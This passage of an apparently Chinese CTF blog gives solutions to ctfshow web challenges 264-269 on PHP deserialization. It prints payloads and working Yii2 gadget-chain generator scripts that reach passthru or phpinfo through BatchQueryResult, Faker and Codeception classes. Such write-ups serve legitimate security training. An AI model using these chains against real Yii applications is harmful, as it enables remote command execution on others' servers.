payload: <code>?f=&amp;m=&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></p>\n<p>提交后，再访问 message.php，由于需要设置 cookie 的 msg 值，故设置，刷新网页，得到 flag</p>\n<h1 id=\"web-265\"><a class=\"anchor\" href=\"#web-265\">#</a> web 265</h1>\n<p>php 按地址传参</p>\n<p>变量引用</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfshowAdmin</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token operator\">=</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token operator\">===</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfshowAdmin</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><h1 id=\"web-266\"><a class=\"anchor\" href=\"#web-266\">#</a> web 266</h1>\n<p>PHP 特性：函数名和类名不区分大小写，变量名区分。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-12-04 23:52:24</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-12-05 00:17:08</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$cs</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://input'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfshow</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token variable\">$ctfshowo</span><span class=\"token operator\">=</span>@<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cs</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ctfshow/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$cs</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Error <span class=\"token interpolation\"><span class=\"token variable\">$ctfshowo</span></span>\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>payload: <code>O:7:&quot;Ctfshow&quot;:0:&#123;&#125;</code></p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/ctfshow/Web-vip/web266.jpg\" alt=\"\" /></p>\n<h1 id=\"web-267\"><a class=\"anchor\" href=\"#web-267\">#</a> web 267</h1>\n<p>弱密码登入 admin/admin</p>\n<p>查看源码知 view-source</p>\n<p>在 page 下找到反序列换入口</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这里为 <code>yii</code>  的反序列化链</p>\n<p>只有 <code>passthru</code>  有回显</p>\n<p>最后的 payload：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?r&#x3D;&#x2F;backdoor&#x2F;shell&amp;code&#x3D;TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6ODoicGFzc3RocnUiO3M6MjoiaWQiO3M6OToidGFjIC9mbGFnIjt9aToxO3M6MzoicnVuIjt9fX19</pre></td></tr></table></figure><p>脚本</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">CreateAction</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$checkAccess</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">checkAccess</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'passthru'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">id</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'tac /flag'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Faker</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest<span class=\"token punctuation\">\\</span>CreateAction</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Generator</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$formatters</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">formatters</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'close'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">CreateAction</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'run'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>db</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">Faker<span class=\"token punctuation\">\\</span>Generator</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">BatchQueryResult</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">private</span> <span class=\"token variable\">$_dataReader</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">_dataReader</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Generator</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">namespace</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">yii<span class=\"token punctuation\">\\</span>db<span class=\"token punctuation\">\\</span>BatchQueryResult</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwcyUzQSUyRiUyRm1wLndlaXhpbi5xcS5jb20lMkZzJTNGX19iaXolM0RNelU1TURJME9ESTVNUSUzRCUzRCUyNm1pZCUzRDIyNDc0ODUxMjklMjZpZHglM0QxJTI2c24lM0RiMjdlM2ZlODQ1ZGFlZTJmYjEzYmI5ZjM2ZjUzYWI0MA==\">复现文章 2</span></p>\n<h1 id=\"web-268\"><a class=\"anchor\" href=\"#web-268\">#</a> web 268</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">CreateAction</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$checkAccess</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">checkAccess</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'phpinfo'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">id</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Faker</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest<span class=\"token punctuation\">\\</span>CreateAction</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Generator</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$formatters</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token comment\">// 这里需要改为 isRunning</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">formatters</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'isRunning'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">CreateAction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'run'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">// poc2</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Codeception<span class=\"token punctuation\">\\</span>Extension</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">Faker<span class=\"token punctuation\">\\</span>Generator</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">RunProcess</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">private</span> <span class=\"token variable\">$processes</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">processes</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Generator</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">namespace</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token comment\">// 生成 poc</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Codeception<span class=\"token punctuation\">\\</span>Extension<span class=\"token punctuation\">\\</span>RunProcess</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h1 id=\"web-269\"><a class=\"anchor\" href=\"#web-269\">#</a> web 269</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">CreateAction</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$checkAccess</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">checkAccess</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'phpinfo'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">id</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  